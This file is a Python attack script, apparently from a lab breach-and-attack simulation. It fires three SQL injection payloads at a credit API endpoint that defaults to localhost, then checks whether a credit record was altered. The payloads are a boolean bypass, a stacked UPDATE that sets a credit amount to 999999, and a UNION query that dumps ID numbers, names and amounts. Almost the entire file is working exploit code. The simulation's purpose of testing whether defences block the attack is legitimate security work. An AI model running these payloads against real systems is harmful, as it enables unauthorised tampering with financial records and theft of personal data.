"""
THE BREAK - BAS4: Inyeccion SQL en Amazon RDS (Nodo B, Manipulacion Tecnica)

Ejecuta 3 payloads clasicos de SQLi contra el endpoint vulnerable /credit/<id>
del API Gateway, e intenta modificar el monto de un credito existente sin autorizacion.

Uso:
    python sqli_attack.py --target http://localhost:8080
"""
import argparse
import json
import time
import requests

PAYLOADS = [
    {"name": "boolean_bypass", "id": "1 OR 1=1"},
    {"name": "stacked_update_tampering", "id": "1; UPDATE credits SET monto=999999.00 WHERE id=1; SELECT 1--"},
    {"name": "union_based_dump", "id": "1 UNION SELECT id, dni, nombre, monto, estado FROM credits--"},
]


def run(target):
    results = []
    tampering_success = False

    for p in PAYLOADS:
        try:
            resp = requests.get(f"{target}/credit/{p['id']}", timeout=5)
            ok = resp.status_code == 200
            body = resp.json() if ok else {"error": resp.text}
        except Exception as e:
            ok = False
            body = {"error": str(e)}

        results.append({"payload": p["name"], "raw_id": p["id"],
                         "http_status": getattr(resp, "status_code", None) if 'resp' in dir() else None,
                         "success": ok, "response": body})
        print(f"[SQLi] {p['name']:28s} -> success={ok}")

    # Verificar si el tampering realmente cambio el registro id=1
    try:
        check = requests.get(f"{target}/credit/1", timeout=5).json()
        rows = check.get("results", [])
        if rows and float(rows[0].get("monto", 0)) >= 999999:
            tampering_success = True
    except Exception:
        pass

    summary = {
        "attack": "sqli_tampering",
        "timestamp": time.time(),
        "target": target,
        "tampering_success": tampering_success,
        "payload_results": results,
        "blocked": not tampering_success and all(not r["success"] or "error" in r["response"] for r in results),
    }
    print(json.dumps(summary, indent=2, ensure_ascii=False))
    return summary


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:8080")
    parser.add_argument("--out", default="metrics/sqli_result.json")
    args = parser.parse_args()

    result = run(args.target)
    try:
        with open(args.out, "w") as f:
            json.dump(result, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"(no se pudo escribir metrics: {e})")
